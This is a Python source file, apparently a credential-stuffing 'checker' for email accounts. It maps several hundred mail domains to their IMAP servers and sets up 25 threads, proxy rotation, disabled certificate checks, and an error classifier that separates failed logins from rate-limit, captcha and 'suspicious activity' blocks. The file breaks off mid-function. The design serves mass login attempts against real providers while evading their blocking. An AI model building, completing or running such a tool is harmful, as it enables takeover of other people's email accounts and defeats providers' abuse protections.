from __future__ import annotations
import os
import sys
import csv
import ssl
import socket
import imaplib
import time
import threading
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any, Optional
import itertools

try:
    from rich.align import Align
    from rich.box import (
        ROUNDED, DOUBLE, HEAVY, HEAVY_EDGE, SIMPLE_HEAD, SIMPLE,
        MINIMAL, MINIMAL_HEAVY_HEAD, HORIZONTALS, SQUARE,
    )
    from rich.columns import Columns
    from rich.console import Console, Group, RenderableType
    from rich.live import Live
    from rich.layout import Layout
    from rich.markup import escape
    from rich.panel import Panel
    from rich.rule import Rule
    from rich.spinner import Spinner
    from rich.table import Table
    from rich.text import Text
    from rich.theme import Theme
    from rich.tree import Tree
except ImportError:
    print("  missing dependency → pip install rich")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════
#  THEME + CONSOLE
# ═══════════════════════════════════════════════════════════════

THEME = Theme({
    "primary":  "bold bright_cyan",
    "accent":   "bold bright_magenta",
    "success":  "bold bright_green",
    "danger":   "bold bright_red",
    "warning":  "bold bright_yellow",
    "info":     "bright_white",
    "dim":      "dim white",
    "muted":    "dim bright_black",
    "border":   "bright_cyan",
    "title":    "bold bright_white",
    "banner":   "bold bright_cyan",
    "credit":   "bold bright_magenta",
})

console = Console(theme=THEME, highlight=False, soft_wrap=False)


# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

VERSION       = "2.1"
WORKERS       = 25
TIMEOUT       = 15
RECENT_LOG    = 40
RECENT_VALID  = 200
OUTPUT_DIR    = Path(".")
MAX_FALLBACK  = 2

# ── PROXY ──────────────────────────────────────────────────────
PROXY_FILE    = "proxies.txt"   # bu dosya varsa otomatik yüklenir
PROXY_TYPE    = "socks5"        # "socks5" | "socks4" | "http"
USE_PROXY     = None            # None → otomatik (dosya varsa evet)


# ═══════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════

BANNER = r"""

███╗░░░███╗██╗██╗░░██╗  ██████╗░░█████╗░██╗░░░██╗██╗░░░░░██╗███████╗
████╗░████║██║╚██╗██╔╝  ██╔══██╗██╔══██╗██║░░░██║██║░░░░░██║╚════██║
██╔████╔██║██║░╚███╔╝░  ██████╦╝██║░░██║██║░░░██║██║░░░░░██║░░███╔═╝
██║╚██╔╝██║██║░██╔██╗░  ██╔══██╗██║░░██║██║░░░██║██║░░░░░██║██╔══╝░░
██║░╚═╝░██║██║██╔╝╚██╗  ██████╦╝╚█████╔╝╚██████╔╝███████╗██║███████╗
╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝  ╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝╚══════╝
"""


# ═══════════════════════════════════════════════════════════════
#  PROVIDERS
# ═══════════════════════════════════════════════════════════════

def _grp(host: str, *domains: str, port: int = 993, mode: str = "ssl") -> dict:
    """Map every domain in the group to (host, port, mode)."""
    return {d: (host, port, mode) for d in domains}


PROVIDERS: dict[str, tuple[str, int, str]] = {}


# ── GOOGLE ─────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.gmail.com",
        "gmail.com", "googlemail.com",
    ),
})


# ── MICROSOFT ──────────────────────────────────────────────────
_MS = "outlook.office365.com"

PROVIDERS.update({
    **_grp(_MS,
        "outlook.com", "outlook.co.uk", "outlook.de", "outlook.fr", "outlook.it",
        "outlook.es", "outlook.nl", "outlook.be", "outlook.at", "outlook.ch",
        "outlook.dk", "outlook.se", "outlook.no", "outlook.fi", "outlook.ie",
        "outlook.pt", "outlook.gr", "outlook.pl", "outlook.cz", "outlook.ro",
        "outlook.hu", "outlook.bg", "outlook.co.jp", "outlook.jp", "outlook.kr",
        "outlook.com.au", "outlook.co.nz", "outlook.co.in", "outlook.com.sg",
        "outlook.com.my", "outlook.co.id", "outlook.ph", "outlook.com.vn",
        "outlook.com.hk", "outlook.com.tw", "outlook.com.br", "outlook.com.mx",
        "outlook.com.ar", "outlook.com.tr", "outlook.com.sa", "outlook.ae",
    ),
    **_grp(_MS,
        "hotmail.com", "hotmail.co.uk", "hotmail.de", "hotmail.fr", "hotmail.it",
        "hotmail.es", "hotmail.nl", "hotmail.be", "hotmail.at", "hotmail.ch",
        "hotmail.dk", "hotmail.se", "hotmail.no", "hotmail.fi", "hotmail.ie",
        "hotmail.pt", "hotmail.gr", "hotmail.pl", "hotmail.cz", "hotmail.ro",
        "hotmail.co.jp", "hotmail.com.au", "hotmail.co.nz", "hotmail.co.in",
        "hotmail.com.br", "hotmail.com.mx", "hotmail.com.ar", "hotmail.com.tr",
        "hotmail.com.sa", "hotmail.ae",
    ),
    **_grp(_MS,
        "live.com", "live.co.uk", "live.de", "live.fr", "live.it", "live.es",
        "live.nl", "live.be", "live.at", "live.ch", "live.dk", "live.se",
        "live.no", "live.fi", "live.ie", "live.pt", "live.pl", "live.cz",
        "live.ro", "live.co.jp", "live.jp", "live.kr", "live.com.au",
        "live.co.nz", "live.co.in", "live.com.sg", "live.com.my", "live.co.id",
        "live.ph", "live.com.vn", "live.com.hk", "live.com.tw", "live.com.br",
        "live.com.mx", "live.com.ar", "live.com.tr", "live.com.sa",
        "msn.com",
    ),
})


# ── YAHOO ──────────────────────────────────────────────────────
_YH = "imap.mail.yahoo.com"

PROVIDERS.update({
    **_grp(_YH,
        "yahoo.com", "yahoo.co.uk", "yahoo.de", "yahoo.fr", "yahoo.it",
        "yahoo.es", "yahoo.nl", "yahoo.be", "yahoo.at", "yahoo.ch",
        "yahoo.dk", "yahoo.se", "yahoo.no", "yahoo.fi", "yahoo.ie",
        "yahoo.pt", "yahoo.gr", "yahoo.ro", "yahoo.pl", "yahoo.cz",
        "yahoo.hu", "yahoo.bg", "yahoo.co.jp", "yahoo.co.kr",
        "yahoo.com.au", "yahoo.co.nz", "yahoo.co.in", "yahoo.com.sg",
        "yahoo.com.my", "yahoo.co.id", "yahoo.com.ph", "yahoo.com.vn",
        "yahoo.com.hk", "yahoo.com.tw", "yahoo.com.br", "yahoo.com.mx",
        "yahoo.com.ar", "yahoo.com.co", "yahoo.com.pe", "yahoo.com.tr",
        "yahoo.com.sa", "yahoo.ae", "yahoo.com.ng", "yahoo.co.za",
        "yahoo.co.il", "ymail.com", "rocketmail.com",
    ),
})


# ── AOL ────────────────────────────────────────────────────────
_AOL = "imap.aol.com"

PROVIDERS.update({
    **_grp(_AOL,
        "aol.com", "aol.co.uk", "aol.de", "aol.fr", "aol.it",
        "aol.es", "aol.jp", "aol.ca", "aim.com",
    ),
})


# ── APPLE iCLOUD ───────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.mail.me.com",
        "icloud.com", "me.com", "mac.com",
    ),
})


# ── YANDEX ─────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.yandex.com",
        "yandex.com", "yandex.ru", "yandex.by", "yandex.kz",
        "yandex.ua", "ya.ru", "yandex.com.tr",
    ),
})


# ── MAIL.RU ────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.mail.ru",
        "mail.ru", "inbox.ru", "bk.ru", "list.ru", "internet.ru",
    ),
})


# ── ZOHO ───────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.zoho.com",    "zoho.com", "zohomail.com"),
    **_grp("imap.zoho.in",     "zoho.in"),
    **_grp("imap.zoho.eu",     "zoho.eu"),
    **_grp("imap.zoho.com.au", "zoho.com.au"),
    **_grp("imap.zoho.jp",     "zoho.jp"),
})


# ── GMX ────────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.gmx.com",
        "gmx.com", "gmx.co.uk", "gmx.fr", "gmx.es", "gmx.us",
    ),
    **_grp("imap.gmx.net",
        "gmx.net", "gmx.de", "gmx.at", "gmx.ch",
    ),
})


# ── GERMAN BIGS ────────────────────────────────────────────────
PROVIDERS.update({
    "web.de":       ("imap.web.de", 993, "ssl"),
    "freenet.de":   ("imap.freenet.de", 993, "ssl"),
    "t-online.de":  ("secureimap.t-online.de", 993, "ssl"),
    "1und1.de":     ("imap.1und1.de", 993, "ssl"),
    "online.de":    ("imap.1und1.de", 993, "ssl"),
    "arcor.de":     ("imap.arcor.de", 993, "ssl"),
})


# ── PRIVACY / SECURE ───────────────────────────────────────────
PROVIDERS.update({
    "posteo.de":      ("posteo.de", 993, "ssl"),
    "posteo.net":     ("posteo.de", 993, "ssl"),
    "mailbox.org":    ("imap.mailbox.org", 993, "ssl"),
    "hushmail.com":   ("imap.hushmail.com", 993, "ssl"),
    "hush.com":       ("imap.hushmail.com", 993, "ssl"),
    "hushmail.me":    ("imap.hushmail.com", 993, "ssl"),
    "runbox.com":     ("imap.runbox.com", 993, "ssl"),
})


# ── FASTMAIL ───────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.fastmail.com",
        "fastmail.com", "fastmail.fm", "fastmail.us", "fastmail.co.uk",
    ),
})


# ── TUTANOTA (bridge only) ─────────────────────────────────────
PROVIDERS.update({
    "tutanota.com": ("imap.tutanota.com", 993, "ssl"),
    "tuta.io":      ("imap.tutanota.com", 993, "ssl"),
    "tuta.com":     ("imap.tutanota.com", 993, "ssl"),
})


# ── MAIL.COM FAMILY ────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.mail.com",
        "mail.com", "email.com", "usa.com", "post.com", "europe.com",
        "dr.com", "consultant.com", "engineer.com", "doctor.com",
        "lawyer.com", "musician.org", "programmer.net", "teacher.com",
        "accountant.com", "scientist.com", "executive.com", "techie.com",
        "linuxmail.org", "iname.com", "mymail.com",
    ),
})


# ── UK ISPs ────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("mail.btinternet.com", "btinternet.com", "btopenworld.com"),
    "virginmedia.com":   ("imap.virginmedia.com", 993, "ssl"),
    "ntlworld.com":      ("imap.ntlworld.com", 993, "ssl"),
    "sky.com":           ("imap.tools.sky.com", 993, "ssl"),
    "talktalk.net":      ("imap.talktalk.net", 993, "ssl"),
    **_grp("imap.tiscali.co.uk", "tiscali.co.uk", "lineone.net"),
    "plus.net":          ("imap.plus.net", 993, "ssl"),
    "waitrose.com":      ("imap.waitrose.com", 993, "ssl"),
    "tesco.net":         ("imap.tesco.net", 993, "ssl"),
    **_grp("imap.orange.net", "orange.net", "orangehome.co.uk"),
    "freeserve.co.uk":   ("imap.freeserve.co.uk", 993, "ssl"),
    "supanet.com":       ("imap.supanet.com", 993, "ssl"),
    "ukonline.co.uk":    ("imap.ukonline.co.uk", 993, "ssl"),
})


# ── US ISPs ────────────────────────────────────────────────────
PROVIDERS.update({
    "comcast.net":       ("imap.comcast.net", 993, "ssl"),
    "verizon.net":       ("imap.verizon.net", 993, "ssl"),
    **_grp("imap.mail.att.net",
        "att.net", "sbcglobal.net", "pacbell.net", "bellsouth.net",
        "ameritech.net", "prodigy.net", "flash.net", "nvbell.net",
        "swbell.net", "wans.net",
    ),
    "cox.net":           ("imap.cox.net", 993, "ssl"),
    "charter.net":       ("mobile.charter.net", 993, "ssl"),
    **_grp("imap.rr.com",
        "roadrunner.com", "rr.com", "twc.com", "brighthouse.com", "hawaii.rr.com",
    ),
    "earthlink.net":     ("imap.earthlink.net", 993, "ssl"),
    "windstream.net":    ("imap.windstream.net", 993, "ssl"),
    **_grp("imap.frontier.com", "frontier.com", "frontiernet.net"),
    "centurylink.net":   ("imap.centurylink.net", 993, "ssl"),
    "q.com":             ("imap.q.com", 993, "ssl"),
    "suddenlink.net":    ("imap.suddenlink.net", 993, "ssl"),
    "wowway.com":        ("imap.wowway.com", 993, "ssl"),
    "mediacomcc.com":    ("imap.mediacomcc.com", 993, "ssl"),
    "optimum.net":       ("imap.optimum.net", 993, "ssl"),
    "rcn.com":           ("imap.rcn.com", 993, "ssl"),
    **_grp("imap.netzero.com", "netzero.net", "netzero.com", "bluelight.com"),
    "juno.com":          ("imap.juno.com", 993, "ssl"),
})


# ── FRENCH ISPs ────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.wanadoo.fr", "wanadoo.fr"),
    **_grp("imap.orange.fr",  "orange.fr"),
    "free.fr":           ("imap.free.fr", 993, "ssl"),
    "sfr.fr":            ("imap.sfr.fr", 993, "ssl"),
    "neuf.fr":           ("imap.neuf.fr", 993, "ssl"),
    "numericable.fr":    ("imap.numericable.fr", 993, "ssl"),
    "bbox.fr":           ("imap.bbox.fr", 993, "ssl"),
    "laposte.net":       ("imap.laposte.net", 993, "ssl"),
    "club-internet.fr":  ("imap.club-internet.fr", 993, "ssl"),
    "aliceadsl.fr":      ("imap.aliceadsl.fr", 993, "ssl"),
    "9online.fr":        ("imap.9online.fr", 993, "ssl"),
    "cegetel.net":       ("imap.cegetel.net", 993, "ssl"),
})


# ── ITALIAN ISPs ───────────────────────────────────────────────
PROVIDERS.update({
    "tiscali.it":        ("imap.tiscali.it", 993, "ssl"),
    "libero.it":         ("imap.libero.it", 993, "ssl"),
    "virgilio.it":       ("imap.virgilio.it", 993, "ssl"),
    "tin.it":            ("imap.tin.it", 993, "ssl"),
    "alice.it":          ("imap.alice.it", 993, "ssl"),
    "fastwebnet.it":     ("imap.fastwebnet.it", 993, "ssl"),
    "telecomitalia.it":  ("imap.telecomitalia.it", 993, "ssl"),
    "inwind.it":         ("imap.inwind.it", 993, "ssl"),
})


# ── SPANISH ISPs ───────────────────────────────────────────────
PROVIDERS.update({
    "wanadoo.es":        ("imap.wanadoo.es", 993, "ssl"),
    "telefonica.net":    ("imap.telefonica.net", 993, "ssl"),
    "terra.es":          ("imap.terra.es", 993, "ssl"),
    "ya.com":            ("imap.ya.com", 993, "ssl"),
    "ono.com":           ("imap.ono.com", 993, "ssl"),
    "movistar.es":       ("imap.movistar.es", 993, "ssl"),
    "euskaltel.net":     ("imap.euskaltel.net", 993, "ssl"),
})


# ── DUTCH ISPs ─────────────────────────────────────────────────
PROVIDERS.update({
    "xs4all.nl":         ("imap.xs4all.nl", 993, "ssl"),
    "ziggo.nl":          ("imap.ziggo.nl", 993, "ssl"),
    "kpnmail.nl":        ("imap.kpnmail.nl", 993, "ssl"),
    "hetnet.nl":         ("imap.hetnet.nl", 993, "ssl"),
    "planet.nl":         ("imap.planet.nl", 993, "ssl"),
    "online.nl":         ("imap.online.nl", 993, "ssl"),
    "home.nl":           ("imap.home.nl", 993, "ssl"),
    "upcmail.nl":        ("imap.upcmail.nl", 993, "ssl"),
})


# ── NORDIC ─────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.telia.com", "telia.com"),
    **_grp("imap.telia.se",  "telia.se"),
    **_grp("imap.telia.dk",  "telia.dk"),
    "telenor.no":        ("imap.telenor.no", 993, "ssl"),
    "telenor.se":        ("imap.telenor.se", 993, "ssl"),
    "online.no":         ("imap.online.no", 993, "ssl"),
    "c2i.net":           ("imap.c2i.net", 993, "ssl"),
    "bredband.net":      ("imap.bredband.net", 993, "ssl"),
    "comhem.se":         ("imap.comhem.se", 993, "ssl"),
    "bahnhof.se":        ("imap.bahnhof.se", 993, "ssl"),
    "spray.se":          ("imap.spray.se", 993, "ssl"),
    "passagen.se":       ("imap.passagen.se", 993, "ssl"),
    "tele2.se":          ("imap.tele2.se", 993, "ssl"),
    "tele2.no":          ("imap.tele2.no", 993, "ssl"),
    "tele2.com":         ("imap.tele2.com", 993, "ssl"),
    "elisa.fi":          ("imap.elisa.fi", 993, "ssl"),
    "saunalahti.fi":     ("imap.saunalahti.fi", 993, "ssl"),
    "luukku.com":        ("imap.luukku.com", 993, "ssl"),
    "suomi24.fi":        ("imap.suomi24.fi", 993, "ssl"),
    "kolumbus.fi":       ("imap.kolumbus.fi", 993, "ssl"),
})


# ── EASTERN EUROPE ─────────────────────────────────────────────
PROVIDERS.update({
    "seznam.cz":         ("imap.seznam.cz", 993, "ssl"),
    "centrum.cz":        ("imap.centrum.cz", 993, "ssl"),
    "email.cz":          ("imap.email.cz", 993, "ssl"),
    "volny.cz":          ("imap.volny.cz", 993, "ssl"),
    "atlas.cz":          ("imap.atlas.cz", 993, "ssl"),
    "azet.sk":           ("imap.azet.sk", 993, "ssl"),
    "zoznam.sk":         ("imap.zoznam.sk", 993, "ssl"),
    "post.sk":           ("imap.post.sk", 993, "ssl"),
    "wp.pl":             ("imap.wp.pl", 993, "ssl"),
    "onet.pl":           ("imap.onet.pl", 993, "ssl"),
    "o2.pl":             ("imap.o2.pl", 993, "ssl"),
    "interia.pl":        ("imap.interia.pl", 993, "ssl"),
    "gazeta.pl":         ("imap.gazeta.pl", 993, "ssl"),
    "tlen.pl":           ("imap.tlen.pl", 993, "ssl"),
    "poczta.onet.pl":    ("imap.poczta.onet.pl", 993, "ssl"),
    "rambler.ru":        ("imap.rambler.ru", 993, "ssl"),
    "ukr.net":           ("imap.ukr.net", 993, "ssl"),
    "i.ua":              ("imap.i.ua", 993, "ssl"),
    "meta.ua":           ("imap.meta.ua", 993, "ssl"),
    "mail.bg":           ("imap.mail.bg", 993, "ssl"),
    "abv.bg":            ("imap.abv.bg", 993, "ssl"),
})


# ── KOREAN ─────────────────────────────────────────────────────
PROVIDERS.update({
    "naver.com":         ("imap.naver.com", 993, "ssl"),
    "hanmail.net":       ("imap.hanmail.net", 993, "ssl"),
    "daum.net":          ("imap.daum.net", 993, "ssl"),
    "nate.com":          ("imap.nate.com", 993, "ssl"),
    "korea.com":         ("imap.korea.com", 993, "ssl"),
    "chollian.net":      ("imap.chollian.net", 993, "ssl"),
    "dreamwiz.com":      ("imap.dreamwiz.com", 993, "ssl"),
    "kornet.net":        ("imap.kornet.net", 993, "ssl"),
    "paran.com":         ("imap.paran.com", 993, "ssl"),
})


# ── JAPANESE ───────────────────────────────────────────────────
PROVIDERS.update({
    "nifty.com":         ("imap.nifty.com", 993, "ssl"),
    "biglobe.ne.jp":     ("imap.biglobe.ne.jp", 993, "ssl"),
    "so-net.ne.jp":      ("imap.so-net.ne.jp", 993, "ssl"),
    "ocn.ne.jp":         ("imap.ocn.ne.jp", 993, "ssl"),
    "plala.or.jp":       ("imap.plala.or.jp", 993, "ssl"),
    "infoseek.jp":       ("imap.infoseek.jp", 993, "ssl"),
    "goo.jp":            ("imap.goo.jp", 993, "ssl"),
    "excite.co.jp":      ("imap.excite.co.jp", 993, "ssl"),
    "ybb.ne.jp":         ("imap.ybb.ne.jp", 993, "ssl"),
    "mopera.net":        ("imap.mopera.net", 993, "ssl"),
    "docomo.ne.jp":      ("imap.spmode.ne.jp", 993, "ssl"),
    "ezweb.ne.jp":       ("imap.au.com", 993, "ssl"),
    "softbank.ne.jp":    ("imap.softbank.ne.jp", 993, "ssl"),
})


# ── CHINESE ────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.qq.com",  "qq.com", "foxmail.com"),
    "163.com":           ("imap.163.com", 993, "ssl"),
    "126.com":           ("imap.126.com", 993, "ssl"),
    "yeah.net":          ("imap.yeah.net", 993, "ssl"),
    "188.com":           ("imap.188.com", 993, "ssl"),
    "21cn.com":          ("imap.21cn.com", 993, "ssl"),
    "sina.com":          ("imap.sina.com", 993, "ssl"),
    "sina.cn":           ("imap.sina.cn", 993, "ssl"),
    "sohu.com":          ("imap.sohu.com", 993, "ssl"),
    "139.com":           ("imap.139.com", 993, "ssl"),
    "wo.cn":             ("imap.wo.cn", 993, "ssl"),
    "189.cn":            ("imap.189.cn", 993, "ssl"),
    "aliyun.com":        ("imap.aliyun.com", 993, "ssl"),
    "tom.com":           ("imap.tom.com", 993, "ssl"),
    "263.net":           ("imap.263.net", 993, "ssl"),
    "china.com":         ("imap.china.com", 993, "ssl"),
    "netease.com":       ("imap.163.com", 993, "ssl"),
    "vip.163.com":       ("imap.vip.163.com", 993, "ssl"),
    "vip.126.com":       ("imap.vip.126.com", 993, "ssl"),
    "vip.sina.com":      ("imap.vip.sina.com", 993, "ssl"),
})


# ── INDIA ──────────────────────────────────────────────────────
PROVIDERS.update({
    **_grp("imap.rediffmail.com", "rediffmail.com", "rediff.com"),
    "sify.com":          ("imap.sify.com", 993, "ssl"),
    "indiatimes.com":    ("imap.indiatimes.com", 993, "ssl"),
    "in.com":            ("imap.in.com", 993, "ssl"),
    "airtelmail.in":     ("imap.airtelmail.in", 993, "ssl"),
    "mtnl.net.in":       ("imap.mtnl.net.in", 993, "ssl"),
    "vsnl.net":          ("imap.vsnl.net", 993, "ssl"),
    "vsnl.com":          ("imap.vsnl.com", 993, "ssl"),
    "bsnl.in":           ("imap.bsnl.in", 993, "ssl"),
    "dataone.in":        ("imap.dataone.in", 993, "ssl"),
    "tataindicom.com":   ("imap.tataindicom.com", 993, "ssl"),
})


# ── LATAM ──────────────────────────────────────────────────────
PROVIDERS.update({
    "uol.com.br":        ("imap.uol.com.br", 993, "ssl"),
    "bol.com.br":        ("imap.bol.com.br", 993, "ssl"),
    "terra.com.br":      ("imap.terra.com.br", 993, "ssl"),
    "ig.com.br":         ("imap.ig.com.br", 993, "ssl"),
    **_grp("imap.globo.com", "globo.com", "globo.com.br"),
    "r7.com":            ("imap.r7.com", 993, "ssl"),
    "zipmail.com.br":    ("imap.zipmail.com.br", 993, "ssl"),
    "terra.com.mx":      ("imap.terra.com.mx", 993, "ssl"),
    "fibertel.com.ar":   ("imap.fibertel.com.ar", 993, "ssl"),
    "speedy.com.ar":     ("imap.speedy.com.ar", 993, "ssl"),
    "ciudad.com.ar":     ("imap.ciudad.com.ar", 993, "ssl"),
    "arnet.com.ar":      ("imap.arnet.com.ar", 993, "ssl"),
    "prodigy.net.mx":    ("imap.prodigy.net.mx", 993, "ssl"),
    "telcel.com":        ("imap.telcel.com", 993, "ssl"),
    "vtr.net":           ("imap.vtr.net", 993, "ssl"),
    "entelmail.cl":      ("imap.entelmail.cl", 993, "ssl"),
    "etb.net.co":        ("imap.etb.net.co", 993, "ssl"),
    "cantv.net":         ("imap.cantv.net", 993, "ssl"),
})


# ── MIDDLE EAST ────────────────────────────────────────────────
PROVIDERS.update({
    "maktoob.com":       ("imap.maktoob.com", 993, "ssl"),
    "batelco.com.bh":    ("imap.batelco.com.bh", 993, "ssl"),
    "sahilonline.net":   ("imap.sahilonline.net", 993, "ssl"),
    "sananet.net":       ("imap.sananet.net", 993, "ssl"),
    "cytanet.com.cy":    ("imap.cytanet.com.cy", 993, "ssl"),
    "walla.co.il":       ("imap.walla.co.il", 993, "ssl"),
    "walla.com":         ("imap.walla.com", 993, "ssl"),
    "bezeqint.net":      ("imap.bezeqint.net", 993, "ssl"),
    "netvision.net.il":  ("imap.netvision.net.il", 993, "ssl"),
    "012.net.il":        ("imap.012.net.il", 993, "ssl"),
})


# ── AUSTRALIA / NEW ZEALAND ────────────────────────────────────
PROVIDERS.update({
    "bigpond.com":       ("imap.bigpond.com", 993, "ssl"),
    "optusnet.com.au":   ("imap.optusnet.com.au", 993, "ssl"),
    "iinet.net.au":      ("imap.iinet.net.au", 993, "ssl"),
    "westnet.com.au":    ("imap.westnet.com.au", 993, "ssl"),
    "tpg.com.au":        ("imap.tpg.com.au", 993, "ssl"),
    "internode.on.net":  ("imap.internode.on.net", 993, "ssl"),
    "dodo.com.au":       ("imap.dodo.com.au", 993, "ssl"),
    "iprimus.com.au":    ("imap.iprimus.com.au", 993, "ssl"),
    "ozemail.com.au":    ("imap.ozemail.com.au", 993, "ssl"),
    "xtra.co.nz":        ("imap.xtra.co.nz", 993, "ssl"),
    "vodafone.co.nz":    ("imap.vodafone.co.nz", 993, "ssl"),
    "slingshot.co.nz":   ("imap.slingshot.co.nz", 993, "ssl"),
    "orcon.net.nz":      ("imap.orcon.net.nz", 993, "ssl"),
})


# ── CANADA ─────────────────────────────────────────────────────
PROVIDERS.update({
    "sympatico.ca":      ("imap.sympatico.ca", 993, "ssl"),
    "bell.net":          ("imap.bell.net", 993, "ssl"),
    "bell.ca":           ("imap.bell.ca", 993, "ssl"),
    "shaw.ca":           ("imap.shaw.ca", 993, "ssl"),
    "rogers.com":        ("imap.rogers.com", 993, "ssl"),
    "videotron.ca":      ("imap.videotron.ca", 993, "ssl"),
    "cogeco.ca":         ("imap.cogeco.ca", 993, "ssl"),
    "telus.net":         ("imap.telus.net", 993, "ssl"),
    "eastlink.ca":       ("imap.eastlink.ca", 993, "ssl"),
    "accesscomm.ca":     ("imap.accesscomm.ca", 993, "ssl"),
    "mts.net":           ("imap.mts.net", 993, "ssl"),
    "sasktel.net":       ("imap.sasktel.net", 993, "ssl"),
})


# ── AFRICA misc ────────────────────────────────────────────────
PROVIDERS.update({
    "telkomsa.net":      ("imap.telkomsa.net", 993, "ssl"),
    "mweb.co.za":        ("imap.mweb.co.za", 993, "ssl"),
    "webmail.co.za":     ("imap.webmail.co.za", 993, "ssl"),
    "vodamail.co.za":    ("imap.vodamail.co.za", 993, "ssl"),
    "mtnloaded.co.za":   ("imap.mtnloaded.co.za", 993, "ssl"),
})


# ── LYCOS + EXCITE ─────────────────────────────────────────────
PROVIDERS.update({
    "lycos.com":         ("imap.lycos.com", 993, "ssl"),
    "lycos.co.uk":       ("imap.lycos.co.uk", 993, "ssl"),
    "lycos.de":          ("imap.lycos.de", 993, "ssl"),
    "lycos.fr":          ("imap.lycos.fr", 993, "ssl"),
    "lycos.it":          ("imap.lycos.it", 993, "ssl"),
    "lycos.es":          ("imap.lycos.es", 993, "ssl"),
    "lycosmail.com":     ("imap.lycos.com", 993, "ssl"),
    "excite.com":        ("imap.excite.com", 993, "ssl"),
    "excite.co.uk":      ("imap.excite.co.uk", 993, "ssl"),
    "excite.it":         ("imap.excite.it", 993, "ssl"),
    "excite.de":         ("imap.excite.de", 993, "ssl"),
    "excite.fr":         ("imap.excite.fr", 993, "ssl"),
})


# ── MISC / NICHE ───────────────────────────────────────────────
PROVIDERS.update({
    "inbox.com":         ("imap.inbox.com", 993, "ssl"),
    "mailinator.com":    ("imap.mailinator.com", 993, "ssl"),
    "yopmail.com":       ("imap.yopmail.com", 993, "ssl"),
    "privaterelay.appleid.com": ("imap.mail.me.com", 993, "ssl"),
    "tweakmail.com":     ("imap.tweakmail.com", 993, "ssl"),
    "duck.com":          ("imap.mail.me.com", 993, "ssl"),
    "duckduckgo.com":    ("imap.mail.me.com", 993, "ssl"),
})


# ═══════════════════════════════════════════════════════════════
#  PROVIDER RUNTIME
# ═══════════════════════════════════════════════════════════════

def resolve_provider(email: str) -> list[tuple[str, int, str]]:
    domain = email.rsplit("@", 1)[-1].lower().strip()
    if domain in PROVIDERS:
        host, port, mode = PROVIDERS[domain]
        return [(host, port, mode)]
    return [
        (f"imap.{domain}", 993, "ssl"),
        (f"mail.{domain}", 993, "ssl"),
    ]


def provider_count() -> int:
    return len(PROVIDERS)


def is_known(email: str) -> bool:
    return email.rsplit("@", 1)[-1].lower().strip() in PROVIDERS


# ═══════════════════════════════════════════════════════════════
#  PROXY MANAGER
# ═══════════════════════════════════════════════════════════════

class ProxyManager:
    """
    Thread-safe round-robin proxy pool.
    Desteklenen format:  host:port  veya  user:pass@host:port
    Boş satır ve # yorumları atlanır.
    """
    def __init__(self, proxies: list[str], proxy_type: str = "socks5"):
        self._lock = threading.Lock()
        self.proxies = proxies
        self.ptype = proxy_type
        self._cycle = itertools.cycle(proxies) if proxies else None
        self.fail_count = 0

    def get(self) -> Optional[str]:
        if not self._cycle:
            return None
        with self._lock:
            return next(self._cycle)

    def __bool__(self) -> bool:
        return bool(self.proxies)

    def __len__(self) -> int:
        return len(self.proxies)


def load_proxies(path: str | Path) -> list[str]:
    """Proxy dosyasını yükle. Yoksa boş liste döner (hata vermez)."""
    p = Path(path)
    if not p.exists() or not p.is_file():
        return []
    out: list[str] = []
    with p.open("r", encoding="utf-8", errors="ignore") as fh:
        for raw in fh:
            s = raw.strip()
            if not s or s.startswith("#"):
                continue
            out.append(s)
    return out


# Global proxy manager — main() içinde doldurulur
_proxy_mgr: Optional[ProxyManager] = None


# ═══════════════════════════════════════════════════════════════
#  SSL CONTEXT
# ═══════════════════════════════════════════════════════════════

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE
try:
    _SSL_CTX.set_ciphers("DEFAULT@SECLEVEL=1")
except ssl.SSLError:
    pass


# ═══════════════════════════════════════════════════════════════
#  ERROR CLASSIFIER
# ═══════════════════════════════════════════════════════════════

AUTH_FAIL_RE = (
    "authentication failed", "authenticationfailed", "invalid credentials",
    "invalid login", "invalid password", "invalid user", "invalid username",
    "login failed", "login invalid", "bad credentials", "username or password",
    "incorrect password", "incorrect username", "wrong password", "wrong user",
    "no such user", "user not found", "account disabled", "account locked",
    "account suspended", "account blocked", "unauthorized", "auth error",
    "auth failure", "[auth]", "not authorized", "authenticationerror",
    "protocolerror", "access denied", "authorization failed",
)

BLOCK_RE = (
    "too many", "rate limit", "ratelimit", "throttled", "try again later",
    "temporarily blocked", "ip blacklisted", "blocked by", "suspicious activity",
    "captcha",
)

NET_FAIL_RE = (
    "timed out", "timeout", "etimedout", "econnrefused", "enotfound",
    "ehostunreach", "enetunreach", "econnreset", "econnaborted", "socket",
    "network", "dns", "unreachable", "handshake", "certificate", "ssl", "tls",
    "unexpected eof", "connection refused", "connection reset",
    "connection aborted", "name or service not known", "no route to host",
    "temporary failure", "getaddrinfo", "proxy", "socks",
)


def classify_error(err: Any) -> tuple[str, str]:
    if err is None:
        return ("ERROR", "unknown")

    raw = getattr(err, "response", None) or getattr(err, "args", None)
    if isinstance(err, BaseException):
        parts = []
        if getattr(err, "response", None):
            parts.append(str(err.response))
        parts.append(str(err))
        raw = " ".join(p for p in parts if p)

    if isinstance(raw, tuple):
        raw = " ".join(str(x) for x in raw if x)
    elif not isinstance(raw, str):
        raw = str(raw) if raw is not None else "unknown"

    msg = " ".join(raw.replace("\r", " ").replace("\n", " ").split())
    low = msg.lower()

    if any(t in low for t in BLOCK_RE):
